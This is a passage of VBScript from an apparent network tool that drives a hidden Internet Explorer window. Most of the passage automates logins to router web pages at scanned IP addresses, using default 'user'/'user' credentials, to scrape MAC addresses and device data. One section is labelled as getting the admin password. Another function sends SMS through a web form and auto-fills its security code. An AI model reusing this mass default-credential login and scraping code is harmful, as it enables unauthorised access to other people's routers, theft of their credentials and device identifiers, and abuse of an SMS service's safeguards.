objTextFile.WriteLine(ipaddressInfo)
objTextFile.Close
Else
set objTextFile = objFSO.CreateTextFile(textFilePath)
objTextFile.WriteLine(ipaddressInfo)
objTextFile.Close
End If
Set textFilePath = Nothing
Set objFSO = Nothing
Set newbaseMac = Nothing
Set objTextFile = Nothing
End Sub 'end appendFile
Function CountLineIpScan
Set fso = CreateObject("Scripting.FileSystemObject") 
filename = "savePage.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set theFile = fso.OpenTextFile(textFilePath, 8, True) 
'macLineNumber.value = theFile.Line -1 ' for textbox
liveIpLineNumber.innerhtml = theFile.Line -1
CountLineIpScan = theFile.Line -1
theFile.Close
Set fso = Nothing
Set theFile = Nothing
End Function
Sub CountLineCurrntLiveIpScan
Set fso = CreateObject("Scripting.FileSystemObject") 
filename = "IpInfo.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set theFile = fso.OpenTextFile(textFilePath, 8, True) 
'macLineNumber.value = theFile.Line -1 ' for textbox
liveIpLineNumber.innerhtml = theFile.Line -1
theFile.Close
Set fso = Nothing
Set theFile = Nothing
End Sub
''
''
''BEGIN new TEXT Test
''
Function SendTextSMS(phonePrefixNum,phoneNum,txtMessageToSent)
On Error Resume Next
KillInternetExplorer
resultScan = False
txtmytLinkOne = "www.txtmyt.org/pb.php?ca=1"
txtmytLinkTwo = "www.txtmyt.org"
txtOkSent = "http://www.txtmyt.org/?msg=sent"
Sleeper 500 
''commentText
Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
IE.navigate "http://" & txtmytLinkOne
'On Error Resume Next
''Sleeper 5000 
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
''TestObjectFieldSetError(IE)

IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
''Sleeper 3000
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectFieldSetError(IE)
If IsUsernameExist Then	
IE.Navigate "http://" & txtmytLinkTwo
Sleeper 1000
WaitIEtoLoad(IE)
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogMacGenScan txtmytLinkOne & ".... is taking TOO LONG to respond. Connection Terminated..."
deniedAccess = "Sorry failed to ACCESS on " & txtmytLinkOne &"....(Please try again.....)"
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
Sleeper 1000
SendTextSMS = resultScan
Exit Function
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & txtmytLinkOne &"...."
createTxtLogError LogContents.value  
IE.Quit
KillInternetExplorer
Sleeper 1000
SendTextSMS = resultScan
Exit Function
End If
End If
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0

If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
SendTextSMS = resultScan
Exit Function
End If
IsUsernameExist = False
checkCountName = 0

''
''BEDGIn second do txtmytLinkTwo
ClearSaveWebPage("txtMytSecurityCode.txt")
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCommentText(IE)
If IsUsernameExist Then

''phonePrefix = "+63915" ''phonePrefixNum,phoneNum
set objSelectIdDomainDef = IE.document.getElementsByName("prfm")
for i = 0 to objSelectIdDomainDef(0).length''for i = 0 to objSelect.length - 2
If objSelectIdDomainDef(0).options(i).value = phonePrefixNum   Then
objSelectIdDomainDef(0).selectedIndex = i
Sleeper 1000
Exit for
End if
Next
''
Sleeper 1000
set objSelectIdInputPhone = IE.document.getElementsByName("pofm")
objSelectIdInputPhone(0).value = phoneNum
Sleeper 1000
Set setUserName = IE.document.getElementByID("commentText") 
setUserName.Value = txtMessageToSent

IE.Stop
Sleeper 1000
Set formElement = IE.document.getElementsByTagName("form") 
For Each Elem In formElement
formBody = Elem.innerHTML
formBody = Replace(formBody, vbCr, "")
formBody = Replace(formBody, vbLf, "")
Save2File formBody, "txtMytSecurityCode.txt"
Next
Sleeper 1000
txtmytcode
set objSelectIdSecurityCode = IE.document.getElementsByName("txtmytcode")
objSelectIdSecurityCode(0).value = GetTxtMytCode

Sleeper 1000
For Each btn In IE.document.getElementsByTagName("input")
If btn.type = "submit" Then 
btn.Click()
End If
Next
Sleeper 1000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Then
IE.Refresh
ElseIf checkCountName = 13 Then
DisplayLogMacGenScan txtmytLinkTwo & ".... is taking TOO LONG to respond. Connection Terminated..."
deniedAccess = txtmytLinkTwo & ".... is taking TOO LONG to respond.....(Please try again.....)"
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
Sleeper 1000
SendTextSMS = resultScan
Exit Function
End If
If checkCountName = 6 Or checkCountName = 9 Or checkCountName = 17 Then
Sleeper 2000
Dim strTitleTwo : strTitleTwo = UCase(IE.Document.Title)
If InStr(strTitleTwo, "CANNOT") <> 0 OR InStr(strTitleTwo, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & txtmytLinkTwo &"...."
deniedAccess = "Sorry failed to ACCESS on " & txtmytLinkTwo &"....(Please try again.....)"
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
Sleeper 1000
SendTextSMS = resultScan
Exit Function
End If
End If

End If
Sleeper 2000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
SendTextSMS = resultScan
Exit Function
End If
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''END second do txtmytLinkTwo
''
''
''BEGIN third do checkSENT SMS
WaitIEtoLoad(IE)
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectFieldSetErrorSent(IE)
If IsUsernameExist Then	
''MsgBox "Sent"
resultScan = True
Sleeper 1000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogMacGenScan  "Process is taking TOO LONG to respond. Connection Terminated..."
deniedAccess = "Process is taking TOO LONG to respond.....(Please try again.....)"
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
Sleeper 1000
SendTextSMS = resultScan
Exit Function
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitleThree : strTitleThree = UCase(IE.Document.Title)
If InStr(strTitleThree, "CANNOT") <> 0 OR InStr(strTitleThree, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & txtmytLinkOne &"...."
createTxtLogError LogContents.value  
IE.Quit
KillInternetExplorer
Sleeper 1000
SendTextSMS = resultScan
Exit Function
End If
End If
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0

If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
KillInternetExplorer
SendTextSMS = resultScan
Exit Function
End If
IsUsernameExist = False
checkCountName = 0
''END third do checkSENT SMS
''

IE.Quit
KillInternetExplorer
SendTextSMS = resultScan
End Function
''
''END new TEXT Test
''
''
''BEGIN Login to GET ADMIN PASS 622 2011
''
Function LoginWebToGetPass(ipHost,displayLogNum)
resultScan = False
Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
''DisplayLogIpscan "Accessing  " & ipHost
'DisplayLogIpscan  ipHost & "........ is now processing. Please wait......"
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & ipHost
On Error Resume Next
''Sleeper 3000 
WaitIEtoLoad(IE)
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
''DisplayLogIpscan "Accessing Ok...." 	
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = Trim(inputWebUserUname.value) 
Sleeper 1000

Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = Trim(inputWebUserPassowrd.value) 

Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
IE.Stop
DisplayLog displayLogNum, ipHost & ".... is taking TOO LONG to respond. Connection Terminated..."
deniedAccess = ipHost & ".... is taking TOO LONG to respond.....(Please access it manually)"
createTxtLogError(deniedAccess)
IE.Quit
Sleeper 1000
LoginWebToGetPass = resultScan
Exit Function
End If
If checkCountName = 6 Or checkCountName = 9 Or checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLog displayLogNum,   ipHost & "........ Webserver cannot be found!!!"
IE.Quit
Sleeper 1000
LoginWebToGetPass = resultScan
Exit Function
End If
End If

End If
Sleeper 2000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLog displayLogNum, "Stopping process....Ok!"
IE.Quit
LoginWebToGetPass = resultScan
Exit Function
End If
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
''DisplayLogIpscan "Logging-in...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click
Sleeper 3000
checkCountTitle = 0
Do
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1

If checkCountTitle = 2 Then
''DisplayLogIpscan "Waiting to login...."
End If 

Sleeper 5000 
If checkCountTitle > 6 Then
''
DisplayLog displayLogNum, "Access is DENIED on " & ipHost &"...."
deniedAccess = ipHost & " Access is denied....(Please CHECK Web USER account in WEB settings)"
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
LoginWebToGetPass = resultScan
Exit Function
''
End If 

If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
LoginWebToGetPass = resultScan
Exit Function
End If
Loop While stringResult > 0
checkCountTitle = 0
Sleeper 1000 

DisplayLog displayLogNum,  ipHost & " Login Ok... Please WAIT!"
''DisplayLogIpscan ipHost &  "........ Login OK! Please wait......(processing...)"
''DisplayLogIpscan "Accessing Device Info..."
'	MsgBox TestObjectDuplicateLogin(IE)
'	Exit Function
IsSecurityBtnExist = False
checkCountSecurityBtn = 0
Do
checkCountSecurityBtn = checkCountSecurityBtn + 1
IsSecurityBtnExist = False
IsSecurityBtnExist = TestObjectDeviceInfoTableCheckOnly(IE)
If IsSecurityBtnExist Then
resultScan = True
''DisplayLogIpscan "Accessing Device Info page... Ok!"
Sleeper 1000
LoginWebToGetPass = resultScan
KillInternetExplorer
Sleeper 1000
Exit Do
Else
If checkCountSecurityBtn = 3 Or checkCountSecurityBtn = 10 Or checkCountSecurityBtn = 15 Or checkCountSecurityBtn = 25 Then
''DisplayLogIpscan "Waiting for Device Info page to load...."
IE.Refresh
ElseIf TestObjectDuplicateLogin(IE) Then
DisplayLog displayLogNum, "FAILED!!! Duplicate LOGIN problem on " & ipHost &"...."
deniedAccess = ipHost & " Duplicate LOGIN problem.....(Please Log off your account properly USER and ADMIN)"
createTxtLogError(deniedAccess)
IE.Quit
LoginWebToGetPass = resultScan
KillInternetExplorer
Sleeper 1000
Exit Function
ElseIf checkCountSecurityBtn = 30 Then
DisplayLog displayLogNum, "Sorry FAILED to ACCESS Device Information page on " & ipHost &"...."
deniedAccess = ipHost & " The Device page is taking TOO LONG to respond.....(Please access it manually)"
createTxtLogError(deniedAccess)
IE.Quit
LoginWebToGetPass = resultScan
KillInternetExplorer
Sleeper 1000
Exit Function
End If
End If
Sleeper 3000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLog displayLogNum, "Stopping process....Ok!"
IE.Quit
LoginWebToGetPass = resultScan
Exit Function
End If
Loop While IsSecurityBtnExist = False
IsSecurityBtnExist = False
checkCountSecurityBtn = 0

IE.Quit
LoginWebToGetPass = resultScan
End Function
''
''END Login to GET ADMIN PASS 622 2011
''
''
''BEGIN new TEST get MAC
''
Function ScanIPgetMac(ipHost)
On Error Resume Next
KillInternetExplorer
Sleeper 1000
resultScan = False
Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
''DisplayLogIpscan "Accessing  " & ipHost
'DisplayLogIpscan  ipHost & "........ is now processing. Please wait......"
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & ipHost
''On Error Resume Next
''Sleeper 3000 
WaitIEtoLoad(IE)
''

''
'Sleeper 15000 
'isresultni = TestObjectCheckBtnLogin(ieObject)
'Exit Function
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
''WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
''DisplayLogIpscan "Accessing Ok...." 	
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = "user"''Trim(inputWebUserUname.value) 
If radiobtnWebUserCus.Checked Then
If Trim(inputWebUserUname.value) <> "" then
setUserName.Value = Trim(inputWebUserUname.value)
End If 
End If
Sleeper 1000

Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = "user"''Trim(inputWebUserPassowrd.value) 
If radiobtnWebUserCus.Checked Then
If Trim(inputWebUserPassowrd.value) <> "" then
setPassword.Value = Trim(inputWebUserPassowrd.value)
End If 
End If
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
''
ElseIf TestObjectDeviceInfoTableSixTTMIpScan(IE) Then
resultScan = True
''DisplayLogIpscan "Accessing Device Info page... Ok!"
Sleeper 1000
ScanIPgetMac = resultScan
KillInternetExplorer
Sleeper 1000
Exit Function
''
ElseIf checkCountName = 35 Then
DisplayLogIpscan  ipHost & ".... is taking TOO LONG to respond. Connection Terminated..."
deniedAccess = ipHost & ".... is taking TOO LONG to respond.....(Please access it manually)"
createTxtLogError(deniedAccess)
IE.Quit
Sleeper 1000
ScanIPgetMac = resultScan
Exit Function
End If
If checkCountName = 3 Or  checkCountName = 6 Or checkCountName = 9 Or checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogIpscan  ipHost & "........ is ALIVE! but SECURED!!! (It's not accessible...)"
IE.Quit
Sleeper 1000
ScanIPgetMac = resultScan
Exit Function
End If
End If

End If
Sleeper 2000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
ScanIPgetMac = resultScan
Exit Function
End If
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
''DisplayLogIpscan "Logging-in...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click 
Sleeper 3000
checkCountTitle = 0
Do
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1

If checkCountTitle = 2 Then
''DisplayLogIpscan "Waiting to login...."
End If 

Sleeper 5000 
If checkCountTitle > 6 Then
''
DisplayLogIpscan "Access is DENIED on " & ipHost &"...."
deniedAccess = ipHost & " Access is denied....(Please access it manually)"
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
ScanIPgetMac = resultScan
Exit Function
''
End If 

If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
ScanIPgetMac = resultScan
Exit Function
End If
Loop While stringResult > 0
checkCountTitle = 0
Sleeper 1000 

DisplayLogIpscan  ipHost & "........ is ALIVE! Trying to get INFO.... Please WAIT!"
''DisplayLogIpscan ipHost &  "........ Login OK! Please wait......(processing...)"
''DisplayLogIpscan "Accessing Device Info..."
'	MsgBox TestObjectDuplicateLogin(IE)
'	Exit Function
IsSecurityBtnExist = False
checkCountSecurityBtn = 0
Do
checkCountSecurityBtn = checkCountSecurityBtn + 1
IsSecurityBtnExist = False
IsSecurityBtnExist = TestObjectDeviceInfoTable(IE)
If IsSecurityBtnExist Then
resultScan = True
''DisplayLogIpscan "Accessing Device Info page... Ok!"
Sleeper 1000
ScanIPgetMac = resultScan
KillInternetExplorer
Sleeper 1000
Exit Do
Else
If checkCountSecurityBtn = 3 Or checkCountSecurityBtn = 10 Or checkCountSecurityBtn = 15 Or checkCountSecurityBtn = 25 Then
''DisplayLogIpscan "Waiting for Device Info page to load...."
IE.Refresh
ElseIf TestObjectDuplicateLogin(IE) Then
DisplayLogIpscan "FAILED!!! Duplicate LOGIN problem on " & ipHost &"...."
deniedAccess = ipHost & " Duplicate LOGIN problem.....(Please access it manually)"
createTxtLogError(deniedAccess)
IE.Quit
ScanIPgetMac = resultScan
KillInternetExplorer
Sleeper 1000
Exit Function
ElseIf checkCountSecurityBtn = 30 Then
DisplayLogIpscan "Sorry FAILED to ACCESS Device Information page on " & ipHost &"...."
deniedAccess = ipHost & " The Device page is taking TOO LONG to respond.....(Please access it manually)"
createTxtLogError(deniedAccess)
IE.Quit
ScanIPgetMac = resultScan
KillInternetExplorer
Sleeper 1000
Exit Function
End If
End If
Sleeper 3000
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
ScanIPgetMac = resultScan
Exit Function
End If
Loop While IsSecurityBtnExist = False
IsSecurityBtnExist = False
checkCountSecurityBtn = 0

IE.Quit
ScanIPgetMac = resultScan
End Function
''
''END new TEST get MAC
''
''BEGIN new TEST get MAC SMART
Function ScanIPgetMacSmart(ipHost)
On Error Resume Next
KillInternetExplorer
Sleeper 1000
resultScan = False
Set IE = CreateObject("InternetExplorer.Application")
''Set activateIE = CreateObject("WScript.Shell")          
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
''DisplayLogIpscan "Accessing  " & ipHost
'DisplayLogIpscan  ipHost & "........ is now processing. Please wait......"
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & ipHost & "/ajax.cgi?action=netState"
''On Error Resume Next
''Sleeper 3000 
WaitIEtoLoad(IE)
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogIpscan  ipHost & "........ is ALIVE! but SECURED!!! (It's not accessible...)"
IE.Quit
Sleeper 1000
ScanIPgetMacSmart = resultScan
Exit Function
End If
''
If InStr(strTitle, "404") <> 0 OR InStr(strTitle, "NOT FOUND") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogIpscan ipHost & ".... is using PLDT/Huawei Firmware (Scanning is NOT YET supported)."
errorAccessS = ipHost & ".... is using PLDT/Huawei Firmware (Scanning is NOT YET supported)......(Please access it manually)"
createTxtLogError(errorAccessS)
IE.Quit
Sleeper 1000
ScanIPgetMacSmart = resultScan
Exit Function
End If
''
stringMacInfoRaw = IE.document.body.innerHTML
''GetFullMACsmart(stringMacInfoRaw)
stringMACInfoScan = GetFullMACsmart(stringMacInfoRaw)
sIncorrectStringScan = "NOT FOUND"
countNotFound = 0
Do
If countNotFound = 3 Then
DisplayLogIpscan(ipHost & "........Sorry Unable to extract DEVICE MAC.")
errorAccessS = ipHost & ".... Sorry Unable to extract DEVICE MAC......(Please access it manually)"
createTxtLogError(errorAccessS)
Exit Do
End If 
If InStr(stringMACInfoScan, sIncorrectStringScan) > 0 Then
countNotFound = countNotFound + 1
DisplayLogIpscan(ipHost & "........MAC is EMPTY. Retrying(" &countNotFound & " of 3).")
'IE.Refresh
IE.navigate "http://" & ipHost & "/ajax.cgi?action=netState"
WaitIEtoLoad(IE)
Sleeper 5000
stringMACInfoScan = GetFullMACsmart(stringMacInfoRaw)
Else
''DisplayLogIpscan("Saving MAC info...")
resultScan = True
SaveInfoOfIPUsingRegSmart ipHost,"IpInfo.txt",stringMACInfoScan
IE.Quit
Exit Do
End If
Loop While countNotFound < 5
IE.Quit
ScanIPgetMacSmart = resultScan
''GetFullMACsmart message
''MsgBox message
End Function
''END new TEST get MAC SMART
''
Sub ScanIP(ipHost)
'MsgBox "Inside scanip"
Dim inputNai,inputUserId,inputUserPass
Set IE = CreateObject("InternetExplorer.Application")
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0 
'' ie visibility
IE.navigate "http://" & ipHost
On Error Resume Next
checkIEstatLimit = 0
Do While (IE.readyState <> 4)    
''Sleeper 5000  
checkIEstatLimit = checkIEstatLimit + 1
Sleeper 2000 
If IE.Document.ReadyState = "complete" Then
Exit Do
End If
If checkIEstatLimit > 20 Then
Exit Do
End If 
Loop 
checkIEstatLimit = 0
Sleeper 1000
''testing
docTry = 0
Do While IE.Document Is Nothing
docTry = docTry + 1
If docTry >3 Then
''DisplayLogIpscan "Waiting for the login page to load....."
End If
Sleeper 5000
If docTry >3 Then
''DisplayLogIpscan "Waiting time finish....."
Exit Do
End If
Loop
Sleeper 1000
docBodyTry = 0
Do While IE.Document.body Is Nothing
docBodyTry = docBodyTry + 1
If docBodyTry >3 Then
''DisplayLogIpscan "Waiting for the login page body to load..... "
End If
Sleeper 5000
If docBodyTry >3 Then
''DisplayLogIpscan "Waiting time finish....."
Exit Do
End If
Loop
Sleeper 1000
Dim strTitle : strTitle = UCase(IE.Document.Title)
''DisplayLogIpscan IE.Document.Title
''IE10 '' If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9 ''If InStr(strTitle, "CANNOT") <> 0 Then 
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''DisplayLogIpscan "Sorry failed to gather information on " & ipHost &"...."
''DisplayLogIpscan "Webserver NOT FOUND on " & ipHost &"...."
''DisplayLogIpscan "FAILED: PORT 80 on " &ipHost &".... WAN is CLOSE!!!"
IE.Quit
Exit Sub
End If
''end testing
Sleeper 1000 
checkIEstatLimit = 0
Do While IE.document.getElementByID("txt_Username") Is Nothing
checkIEstatLimit = checkIEstatLimit + 1
If checkIEstatLimit = 2 Then
DisplayLogIpscan "Waiting for the input username to load...."
End If 
If checkIEstatLimit > 15 Then
''Exit Do
Exit Sub
End If
Sleeper 1000 
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
''end if stop
Loop
checkIEstatLimit = 0
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = Trim(inputWebUserUname.value) 
Sleeper 1000 
Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = Trim(inputWebUserPassowrd.value) 
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click
'Sleeper 5000 
Sleeper 1000
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogIpscan IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogIpscan isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
''DisplayLogIpscan "Waiting for the main page to load...."
End If 
Sleeper 5000 
If checkCountTitle > 6 Then
''DisplayLogIpscan "Sorry failed to gather information on " & ipHost &"...."
DisplayLogIpscan "Access is DENIED on " & ipHost &"...."
deniedAccess = ipHost & " Access is denied...."
createTxtLogError(deniedAccess)
IE.Quit
KillInternetExplorer
Exit Sub
End If 
Loop While stringResult > 0

''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
''end if stop

checkcount = 0
getTabInfoBody = ""
checkIEstatLimit = 0
Do While (IE.readyState <> 4)    
'Sleeper 5000  

checkIEstatLimit = checkIEstatLimit + 1
If checkIEstatLimit = 2 Then
'DisplayLogIpscan ("Waiting the page to load........")
End If 
Sleeper 2000 
If IE.Document.ReadyState = "complete" Then
Exit Do
End If
If checkIEstatLimit > 25 Then
Exit Do
End If
Loop 

''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
''end if stop
checkIEstatLimit = 0
DisplayLogIpscan "Preparing...."
'DisplayLogIpscan IE.document.frames("contentfrm").document.body.innerHTML
Do 
'Do While IE.document.frames("contentfrm").document.ReadyState = "complete" 
checkcount = checkcount +1
If checkcount = 2 Then
DisplayLogIpscan "Trying to gather information...."
End If
''IE10 '' getTabInfoBody = IE.document.getElementByID("contentfrm").contentDocument.body.innerHTML
''IE6,8,9 ''getTabInfoBody = IE.document.frames("contentfrm").document.body.innerHTML
getTabInfoBody = IE.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
''MsgBox getTabInfoBody
''MsgBox getTabInfoBody
Save2File getTabInfoBody, "savePage.txt"
If getTabInfoBody <> "" Then
checkcount = 25
End If
If checkcount > 20 Then
''MsgBox "Waiting Time End"
DisplayLogIpscan "NOTICE: Connection to HOST is TERMINATED...."
Exit Do
End If
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogIpscan("Stopping process....Ok!")
IE.Quit
Exit Sub
End If
''end if stop
''WScript.Sleep 10000 
Sleeper 2000 
Loop  While getTabInfoBody = ""
''Loop while CheckTstLogFile (saveWebPageToFile) = False
IE.Quit
End Sub 
''END scanIp
Sub Save2File (sText, sFile)
SaveToStreamFile sText, sFile
End Sub
Sub SaveToStreamFile (textToStrm,fileToStreamName)
Set fso = CreateObject("Scripting.FileSystemObject")
filename = fileToStreamName
fileToStream = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If fso.FileExists(fileToStream)=False Then	
Set objOutputFile = fso.CreateTextFile(fileToStream, True)
objOutputFile.Write textToStrm
objOutputFile.Close
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(fileToStream, ForWriting)
objOutputFile.Write textToStrm
objOutputFile.Close
End If
Set fso = Nothing
End Sub
Sub SaveToStreamFileFailedTEST (textToStrm,fileToStream)
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "saveToStream.vbs"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If Fso.FileExists(textFilePath)=False Then	
Set objOutputFile = fso.CreateTextFile(textFilePath, True)
objOutputFile.WriteLine "Dim objStr"
objOutputFile.WriteLine ("Set objStr = CreateObject("& chr(34) &"ADODB.Stream"& chr(34)&")")
objOutputFile.WriteLine "objStr.Open"
objOutputFile.WriteLine "objStr.Type     = 2"
objOutputFile.WriteLine "objStr.Position = 0"
objOutputFile.WriteLine "objStr.Charset  = "& chr(34) &"utf-8"& chr(34)&""
objOutputFile.WriteLine "objStr.WriteText "& chr(34) &textToStrm & chr(34) 
objOutputFile.WriteLine "objStr.SaveToFile "& chr(34) &fileToStream & chr(34) &", 2"
objOutputFile.WriteLine "objStr.Close"
objOutputFile.WriteLine "Set objStr = Nothing"
objOutputFile.WriteLine "WScript.Quit"	
objOutputFile.Close
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(textFilePath, ForWriting)
objOutputFile.WriteLine "Dim objStr"
